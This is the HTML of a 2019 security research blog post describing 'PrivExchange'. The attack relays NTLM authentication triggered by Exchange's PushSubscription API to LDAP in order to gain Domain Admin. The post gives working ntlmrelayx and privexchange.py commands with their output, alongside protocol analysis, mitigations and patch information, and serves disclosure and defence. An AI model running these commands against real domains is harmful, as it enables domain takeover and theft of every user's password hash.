@@ -1,0 +1,510 @@
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Abusing Exchange: One API call away from Domain Admin - dirkjanm.io</title>
+<meta name="description" content="In most organisations using Active Directory and Exchange, Exchange servers have such high privileges that being an Administrator on an Exchange server is enough to escalate to Domain Admin. Recently I came across a blog from the ZDI, in which they detail a way to let Exchange authenticate to attackers using NTLM over HTTP. This can be combined with an NTLM relay attack to escalate from any user with a mailbox to Domain Admin in probably 90% of the organisations I’ve seen that use Exchange. This attack is possible by default and while no patches are available at the point of writing, there are mitigations that can be applied to prevent this privilege escalation. This blog details the attack, some of the more technical details and mitigations, as well as releasing a proof-of-concept tool for this attack which I’ve dubbed “PrivExchange”. Update: Patches for PrivExchange are available, see the section “Released updates”.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="dirkjanm.io">
+<meta property="og:title" content="Abusing Exchange: One API call away from Domain Admin">
+<meta property="og:url" content="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">
+
+
+  <meta property="og:description" content="In most organisations using Active Directory and Exchange, Exchange servers have such high privileges that being an Administrator on an Exchange server is enough to escalate to Domain Admin. Recently I came across a blog from the ZDI, in which they detail a way to let Exchange authenticate to attackers using NTLM over HTTP. This can be combined with an NTLM relay attack to escalate from any user with a mailbox to Domain Admin in probably 90% of the organisations I’ve seen that use Exchange. This attack is possible by default and while no patches are available at the point of writing, there are mitigations that can be applied to prevent this privilege escalation. This blog details the attack, some of the more technical details and mitigations, as well as releasing a proof-of-concept tool for this attack which I’ve dubbed “PrivExchange”. Update: Patches for PrivExchange are available, see the section “Released updates”.">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2019-01-21T18:08:57+00:00">
+
+
+
+
+
+
+<link rel="canonical" href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="dirkjanm.io Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="/">dirkjanm.io</a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/talks/" >Presentations</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle Menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="http://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/img/thisisapicture.png" alt="Dirk-jan Mollema" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Dirk-jan Mollema</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Hacker, red teamer, researcher. Likes to write infosec-focussed Python tools. This is my personal blog containing research on topics I find interesting, such as (Azure) Active Directory internals, protocols and vulnerabilities.<br /><br />Looking for a security test or training? Business contact via <a href="https://outsidersecurity.nl">outsidersecurity.nl</a>
+
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Both sides of a security boundary</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://twitter.com/_dirkjan" itemprop="sameAs">
+            <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/dirkjanm" itemprop="sameAs">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        
+          <li>
+            <a href="https://www.youtube.com/c/dirkjanm" itemprop="sameAs">
+              <i class="fab fa-fw fa-youtube" aria-hidden="true"></i> YouTube
+            </a>
+          </li>
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Abusing Exchange: One API call away from Domain Admin">
+    <meta itemprop="description" content="In most organisations using Active Directory and Exchange, Exchange servers have such high privileges that being an Administrator on an Exchange server is enough to escalate to Domain Admin. Recently I came across a blog from the ZDI, in which they detail a way to let Exchange authenticate to attackers using NTLM over HTTP. This can be combined with an NTLM relay attack to escalate from any user with a mailbox to Domain Admin in probably 90% of the organisations I’ve seen that use Exchange. This attack is possible by default and while no patches are available at the point of writing, there are mitigations that can be applied to prevent this privilege escalation. This blog details the attack, some of the more technical details and mitigations, as well as releasing a proof-of-concept tool for this attack which I’ve dubbed “PrivExchange”. Update: Patches for PrivExchange are available, see the section “Released updates”.">
+    <meta itemprop="datePublished" content="January 21, 2019">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Abusing Exchange: One API call away from Domain Admin
+</h1>
+          
+            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  11 minute read
+</p>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p>In most organisations using Active Directory and Exchange, Exchange servers have such high privileges that being an Administrator on an Exchange server is enough to escalate to Domain Admin. Recently I came across a blog from the ZDI, in which they detail a way to let Exchange authenticate to attackers using NTLM over HTTP. This can be combined with an NTLM relay attack to escalate from any user with a mailbox to Domain Admin in probably 90% of the organisations I’ve seen that use Exchange. This attack is possible by default <del>and while no patches are available at the point of writing</del>, there are mitigations that can be applied to prevent this privilege escalation. This blog details the attack, some of the more technical details and mitigations, as well as releasing a <a href="https://github.com/dirkjanm/privexchange/">proof-of-concept tool</a> for this attack which I’ve dubbed “PrivExchange”. <strong>Update</strong>: Patches for PrivExchange are available, see the section “Released updates”.</p>
+
+<h1 id="combining-known-vulnerabilities-in-a-new-way">Combining known vulnerabilities in a new way</h1>
+<p>This blog combines a few known vulnerabilities and known protocol weaknesses into a new attack. There are 3 components which are combined to escalate from any user with a mailbox to Domain Admin access:</p>
+
+<ul>
+  <li>Exchange Servers have (too) high privileges by default</li>
+  <li>NTLM authentication is vulnerable to relay attacks</li>
+  <li>Exchange has a feature which makes it authenticate to an attacker with the computer account of the Exchange server</li>
+</ul>
+
+<h2 id="exchange-and-high-privileges">Exchange and high privileges</h2>
+<p>The main vulnerability here is that Exchange has high privileges in the Active Directory domain. The <code class="language-plaintext highlighter-rouge">Exchange Windows Permissions</code> group has <code class="language-plaintext highlighter-rouge">WriteDacl</code> access on the Domain object in Active Directory, which enables any member of this group to modify the domain privileges, among which is the privilege to perform DCSync operations. Users or computers with this privilege can perform synchronization operations that are normally used by Domain Controllers to replicate, which allows attackers to synchronize all the hashed passwords of users in the Active Directory. This has been covered by several researchers (see the references section at the end of this post), and I’ve written about it with my Fox-IT colleague Rindert <a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/">last year</a>. With that post I also released an update to <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py">ntlmrelayx</a> that adds the possibility to perform these Access Control List (ACL) based attack while NTLM relaying.</p>
+
+<h2 id="ntlm-relaying-machine-accounts">NTLM relaying machine accounts</h2>
+<p>NTLM relaying has been around for a while. Previously, the main focus of this was relaying NTLM authentication over SMB in order to get code execution on other hosts. While this unfortunately remains a possibility in many company networks that are not hardened against this by enabling SMB signing, other protocols are also vulnerable to relaying. The most interesting protocol for this is, in my opinion, LDAP, which can be used to read and modify objects in the (Active) directory. If you need a refresher about NTLM relaying, you can read about it in <a href="https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/">a blog</a> I wrote a while ago. The short version is that unless mitigations are applied, it is possible to pass authentication that is performed (automatically) by Windows when it connects to the attacker’s machine on to other machines in the network, as is displayed in the image below:</p>
+
+<p><img src="/assets/img/privexchange/ntlm-auth.svg" alt="NTLM relaying" class="align-center" /></p>
+
+<p>When authentication is relayed to LDAP, objects in the directory can be modified to grant an attacker privileges, including the privileges required for DCSync operations. Thus, if we can get an Exchange server to authenticate to us with NTLM authentication, we can perform the ACL attack. It should be noted that relaying to LDAP only works if the victim is authenticating to us over HTTP, not over SMB (see the section “The technical bits” for an explanation).</p>
+
+<h2 id="getting-exchange-to-authenticate">Getting Exchange to authenticate</h2>
+<p>The only component that was missing until now was an easy way to get Exchange to authenticate to us. A ZDI researcher (who remains unnamed in their article) discovered that it is possible to get Exchange to authenticate to an arbitrary URL over HTTP via the Exchange <code class="language-plaintext highlighter-rouge">PushSubscription</code> feature. In their <a href="https://www.thezdi.com/blog/2018/12/19/an-insincere-form-of-flattery-impersonating-users-on-microsoft-exchange">blog post</a> they used this vulnerability to relay the NTLM authentication back to Exchange (this is called a reflection attack) and impersonate other users. If we instead combine this with the high privileges Exchange has by default and perform a relay attack instead of a reflection attack, we can use these privileges to grant ourselves DCSync rights. The push notification service has an option to send a message every X minutes (where X can be specified by the attacker), even if no event happened. This is something that ensures Exchange will connect to us even if there is no activity in an inbox.</p>
+
+<h1 id="performing-the-privilege-escalation-attack">Performing the privilege escalation attack</h1>
+<p>A schematic of the above attack is displayed below, showing the steps that are performed to escalate privileges:</p>
+
+<p><img src="/assets/img/privexchange/privexchange-drawing.svg" alt="PrivExchange attack" class="align-center" /></p>
+
+<p>We need two tools to perform the attack, <code class="language-plaintext highlighter-rouge">privexchange.py</code> and <code class="language-plaintext highlighter-rouge">ntlmrelayx</code>. You can get both on GitHub in the <a href="https://github.com/dirkjanm/privexchange/">PrivExchange</a> and <a href="https://github.com/SecureAuthCorp/impacket/">impacket</a> repositories.
+Start ntlmrelayx in relay mode with LDAP on a Domain Controller as target, and supply a user under the attackers control to escalate privileges with (in this case the <code class="language-plaintext highlighter-rouge">ntu</code> user):</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntlmrelayx.py -t ldap://s2016dc.testsegment.local --escalate-user ntu
+</code></pre></div></div>
+<p>Now we run the <code class="language-plaintext highlighter-rouge">privexchange.py</code> script:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@localhost:~/exchpoc$ python privexchange.py -ah dev.testsegment.local s2012exc.testsegment.local -u ntu -d testsegment.local
+Password: 
+INFO: Using attacker URL: http://dev.testsegment.local/privexchange/
+INFO: Exchange returned HTTP status 200 - authentication was OK
+ERROR: The user you authenticated with does not have a mailbox associated. Try a different user.
+</code></pre></div></div>
+<p>When this is run with a user which doesn’t have a mailbox, we will get the above error.
+Let’s try it again with a user which does have a mailbox associated:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@localhost:~/exchpoc$ python privexchange.py -ah dev.testsegment.local s2012exc.testsegment.local -u testuser -d testsegment.local 
+Password: 
+INFO: Using attacker URL: http://dev.testsegment.local/privexchange/
+INFO: Exchange returned HTTP status 200 - authentication was OK
+INFO: API call was successful
+</code></pre></div></div>
+<p>After a minute (which is the value supplied for the push notification) we see the connection coming in at ntlmrelayx, which gives our user DCSync privileges:</p>
+
+<p><img src="/assets/img/privexchange/ntlmrelay-exchange.png" alt="ntlmrelayx performing privesc" class="align-center" />
+We confirm the DCSync rights are in place with secretsdump:
+<img src="/assets/img/privexchange/secretsdump-hashes.png" alt="dumping hashes" class="align-center" /></p>
+
+<p>With all the hashed password of all Active Directory users, the attacker can create golden tickets to impersonate any user, or use any users password hash to authenticate to any service accepting NTLM or Kerberos authentication in the domain.</p>
+
+<h1 id="the-technical-bits---relaying-to-ldap-and-signing">The technical bits - relaying to LDAP and signing</h1>
+<p>I mentioned previously that relaying from SMB to LDAP does not work, which is also why this attack can’t be performed by using for example the <a href="https://github.com/leechristensen/SpoolSample/">SpoolService RPC abuse</a> that was recently released (since this authenticates over SMB). Since questions about this keep coming up and there is a lot of confusion about this, let’s look at why this is. If you aren’t looking for a deep dive into NTLM authentication, feel free to skip this section :).</p>
+
+<p>The difference between NTLM authentication in SMB and HTTP lies in the flags that are negotiated by default. The problematic part is the <code class="language-plaintext highlighter-rouge">NTLMSSP_NEGOTIATE_SIGN</code> flag (<code class="language-plaintext highlighter-rouge">0x00000010</code>), documented in <a href="https://msdn.microsoft.com/en-us/library/cc236650.aspx">MS-NLMP section 2.2.2.5</a>. NTLM authentication over HTTP does not set this flag by default, but if it is used over SMB this flag will be set by default:</p>
+
+<p><img src="/assets/img/privexchange/smbtraffic.png" alt="SMB with signing flag set" class="align-center" /></p>
+
+<p>When we relay this to LDAP the authentication will succeed, but LDAP will expect all the messages to be signed with a session key derived from the password (which we don’t have in a relay attack). It will thus ignore any messages without signature, causing our attack to fail.
+One may wonder if it is possible to modify these flags in transit, such that signing is not negotiated. This won’t work on modern versions of Windows since they will include a MIC (Message Integrity Code) by default, which is a signature based on all 3 NTLM messages, so any modification in any of the messages will make it invalid.</p>
+
+<p><img src="/assets/img/privexchange/ntlm-mic.png" alt="SMB with signing flag set" class="align-center" /></p>
+
+<p>Can we remove the MIC? Well yes, we can, since it is not in a protected part of the NTLM message. There is however one last protection in NTLM authentication (NTLMv2 only) that prevents this: Deep within the NTLMv2 response, which is in itself signed with the victim’s password, there is an <code class="language-plaintext highlighter-rouge">AV_PAIR</code> structure which is called <code class="language-plaintext highlighter-rouge">MsvAvFlags</code>. When this field has the value <code class="language-plaintext highlighter-rouge">0x0002</code>, it indicates that the client sent a MIC along with the type 3 message.</p>
+
+<p><img src="/assets/img/privexchange/micflag.png" alt="SMB with signing flag set" class="align-center" /></p>
+
+<p>Modifying the NTLMv2 response will invalidate the authentication, so we can’t remove this flags field. The flag field indicates a MIC was calculated and included, which will make the target server validate the MIC, which in turn validates that all 3 messages were not modified in transit, and thus we can’t remove the signing flag.</p>
+
+<p>This holds true for (I think) only the Microsoft implementation of NTLM. Custom appliances implementing NTLM most likely don’t go down till the level of adding the MIC and <code class="language-plaintext highlighter-rouge">AV_PAIR</code> flags, making them vulnerable to flag modification and thus making SMB-&gt;LDAP relaying possible. An example of this is the <a href="https://conference.hitb.org/hitbsecconf2018dxb/materials/D2T2%20-%20NTLM%20Relay%20Is%20Dead%20Long%20Live%20NTLM%20Relay%20-%20Jianing%20Wang%20and%20Junyu%20Zhou.pdf">Java implementation</a> of NTLM, which can be modified in transit to bypass security measures.</p>
+
+<h1 id="performing-the-attack-without-any-credentials-altogether">Performing the attack without any credentials altogether</h1>
+<p>In the previous section we used compromised credentials to perform the first step of the attack. If an attacker is only in a position to perform a network attack, but doesn’t have any credentials, it is still possible to trigger Exchange to authenticate. If we perform a SMB to HTTP (or HTTP to HTTP) relay attack (using LLMNR/NBNS/mitm6 spoofing) we can relay the authentication of a user in the same network segment to Exchange EWS and use their credentials to trigger the callback (thanks to <a href="https://twitter.com/infosec_kb">Mark</a> for bringing this up!).
+I’ve included a small modified <code class="language-plaintext highlighter-rouge">httpattack.py</code> which you can use with ntlmrelayx to perform the attack from a network perspective without any credentials (you just need to modify your attacker host since it is hard-coded in the file):</p>
+
+<p><img src="/assets/img/privexchange/ews-relay.png" alt="Relaying NTLM authentication to EWS" class="align-center" /></p>
+
+<h1 id="mitigations">Mitigations</h1>
+<p>This attack depends on various components to work. In previous blogs I’ve already highlighted several defences <a href="https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/">against NTLM relaying</a> and against <a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/">relaying to LDAP specifically</a>.</p>
+
+<p>The most important mitigations applicable to this attack are:</p>
+<ul>
+  <li>Remove the unnecessary high privileges that Exchange has on the Domain object by running <code class="language-plaintext highlighter-rouge">setup.exe /PrepareAD</code> from a patched Exchange CU (see below for more info).</li>
+  <li>Enable LDAP signing and <a href="https://support.microsoft.com/en-us/help/4034879/how-to-add-the-ldapenforcechannelbinding-registry-entry">enable LDAP channel binding</a> to prevent relaying to LDAP and LDAPS respectively</li>
+  <li>Block Exchange servers from making connections to workstations on arbitrary ports.</li>
+  <li>Enable <a href="https://msdn.microsoft.com/en-us/library/dd767318%28v=vs.90%29.aspx">Extended Protection for Authentication</a> on the Exchange endpoints in IIS (but not the Exchange Back End ones, this will break Exchange). This will verify the channel binding parameters in the NTLM authentication, which ties NTLM authentication to a TLS connection and prevent relaying to Exchange web services.</li>
+  <li>Remove the registry key which makes relaying back to the Exchange server possible, as discussed in Microsofts <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8581">mitigation for CVE-2018-8518</a>.</li>
+  <li>Enforce SMB signing on Exchange servers (and preferable all other servers and workstations in the domain) to prevent cross-protocol relay attacks to SMB.</li>
+  <li>If EWS push/pull subscriptions aren’t used, they can be disabled by setting the EWSMaxSubscriptions to 0 with a <a href="https://docs.microsoft.com/en-us/powershell/module/exchange/server-health-and-performance/set-throttlingpolicy?view=exchange-ps">throttling policy</a>, as discovered by @gentilkiwi <a href="https://twitter.com/gentilkiwi/status/1088599133986975755">here</a>. I haven’t tested how much these are used by legitimate applications, so testing it with a small user scope is recommended.</li>
+</ul>
+
+<h1 id="the-tools--affected-versions">The tools / affected versions</h1>
+<p>The proof-of concept tools can be found at <a href="https://github.com/dirkjanm/PrivExchange">https://github.com/dirkjanm/PrivExchange</a>. They have been tested on the following Exchange/Windows versions:</p>
+<ul>
+  <li>Exchange 2013 (CU21) on Server 2012R2, relayed to a Server 2016 DC (all fully patched)</li>
+  <li>Exchange 2016 (CU11) on Server 2016, relayed to a Server 2019 DC (all fully patched)</li>
+  <li>Exchange 2019 on Server 2019, relayed to a Server 2019 DC (thanks <a href="https://twitter.com/gentilkiwi/status/1088581788413374465">@gentilkiwi</a> for testing)</li>
+</ul>
+
+<p>The above Exchange servers were installed using Shared permission mode (which is the default), but according to <a href="https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md">this write-up</a> RBAC split permissions deployment is also vulnerable (I haven’t personally tested this).</p>
+
+<p>Exchange 2010 SP3 seems to be <strong>not</strong> affected, in my lab this version negotiated signing similar to SMB as described above, which breaks the relaying attack (thanks to <a href="https://twitter.com/lean0x2f/status/1088441988326801408">@lean0x2f</a> for raising this). Both version <code class="language-plaintext highlighter-rouge">14.3.435.0</code> (latest update at the time of writing) and <code class="language-plaintext highlighter-rouge">14.3.123.4</code> show this behaviour.</p>
+
+<h1 id="released-updates">Released updates</h1>
+<p>On February 12th 2019, Microsoft released updates for Exchange which resolve these issues by removing the automatic authentication Exchange performs when sending out notifications.
+This concerns the following Exchange versions:</p>
+
+<ul>
+  <li>Exchange Server 2019 Cumulative Update 1</li>
+  <li>Exchange Server 2016 Cumulative Update 12</li>
+  <li>Exchange Server 2013 Cumulative Update 22</li>
+  <li>Exchange Server 2010 Service Pack 3 Update Rollup 26</li>
+</ul>
+
+<p>Furthermore, they reviewed the required permissions for Exchange and decided to <strong>reduce</strong> them, so that Exchange no longer has excessively high privileges in AD. For existing Exchange installations, it is required to run <code class="language-plaintext highlighter-rouge">Setup.exe /PrepareAD</code> again from an updated installer, otherwise the privileges will not be removed. For Exchange 2010 the removal of privileges has to be performed manually, instructions are available in <a href="https://support.microsoft.com/en-us/help/4490059/using-shared-permissions-model-to-run-exchange-server">KB4490059</a>.</p>
+
+<p>More information is available on the <a href="https://techcommunity.microsoft.com/t5/exchange-team-blog/released-february-2019-quarterly-exchange-updates/ba-p/609061">Microsoft Exchange blog</a> about this patch.</p>
+
+<h1 id="resources--references">Resources / References</h1>
+<p>The following blogs, white papers and research offer more information about these attacks:</p>
+
+<h2 id="mitigation-resources">Mitigation resources</h2>
+<ul>
+  <li><del><a href="https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/Fix-DomainObjectDACL.ps1">https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/Fix-DomainObjectDACL.ps1</a> (Removing dangerous Exchange permissions with PowerShell)</del> Update: Use <a href="https://techcommunity.microsoft.com/t5/exchange-team-blog/released-february-2019-quarterly-exchange-updates/ba-p/609061">Microsoft’s recommended fix</a> for this.</li>
+  <li><a href="https://www.blackhat.com/docs/webcast/04262018-Webcast-Toxic-Waste-Removal-by-Andy-Robbins.pdf">https://www.blackhat.com/docs/webcast/04262018-Webcast-Toxic-Waste-Removal-by-Andy-Robbins.pdf</a> (Identifying and removing dangerous Exchange permissions, by @_wald0)</li>
+  <li><a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf">ACL privilege escalation research</a> by @_wald0 and @harmj0y</li>
+</ul>
+
+<h2 id="ntlm-relayingsigning-discussions">NTLM relaying/signing discussions</h2>
+<ul>
+  <li><a href="https://github.com/SecureAuthCorp/impacket/issues/451">Review of NTLM reflection attack over network</a></li>
+  <li><a href="https://github.com/SecureAuthCorp/impacket/pull/500">NTLM SMB-&gt;LDAP relaying</a></li>
+  <li><a href="https://www.secureauth.com/blog/playing-relayed-credentials">Playing with relayed credentials</a> by @agsolino</li>
+</ul>
+
+<h2 id="other-references">Other references</h2>
+<ul>
+  <li><a href="https://msdn.microsoft.com/en-us/library/cc236621.aspx">MS-NLMP</a></li>
+  <li><a href="https://www.zerodayinitiative.com/blog/2018/12/19/an-insincere-form-of-flattery-impersonating-users-on-microsoft-exchange">ZDI post on this issue which discusses this Exchange API</a></li>
+  <li><a href="https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/">Remote NTLM Relaying through meterpreter</a> which discusses how to relay through a pivot host remotely.</li>
+  <li><a href="https://www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound">My HITB slides on ACL attacks</a></li>
+</ul>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-01-21T18:08:57+00:00">January 21, 2019</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=Abusing+Exchange%3A+One+API+call+away+from+Domain+Admin%20https%3A%2F%2Fdirkjanm.io%2Fabusing-exchange-one-api-call-away-from-domain-admin%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdirkjanm.io%2Fabusing-exchange-one-api-call-away-from-domain-admin%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=https%3A%2F%2Fdirkjanm.io%2Fabusing-exchange-one-api-call-away-from-domain-admin%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fdirkjanm.io%2Fabusing-exchange-one-api-call-away-from-domain-admin%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/" class="pagination--pager" title="Active Directory forest trusts part 1 - How does SID filtering work?
+">Previous</a>
+    
+    
+      <a href="/krbrelayx-unconstrained-delegation-abuse-toolkit/" class="pagination--pager" title="“Relaying” Kerberos - Having fun with unconstrained delegation
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+    
+    
+    
+      <li><a href="https://github.com/dirkjanm"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+    
+    
+    
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    <li><a rel="license" href="http://creativecommons.org/licenses/by/4.0/"><img alt="Creative Commons License" style="border-width:0" src="/assets/img/cc-by.png" /></a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">All blog content is available under the <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">Creative Commons BY 4.0 License</a> unless stated otherwise.
+  <br />Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> and a modified version of the "Minimal Mistakes" theme</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"></script>
+
+
+
+
+
+
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-G3JYRDGZVR"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-G3JYRDGZVR', { 'anonymize_ip': false});
+</script>
+
+
+
+
+
+
+
+  </body>
+</html>
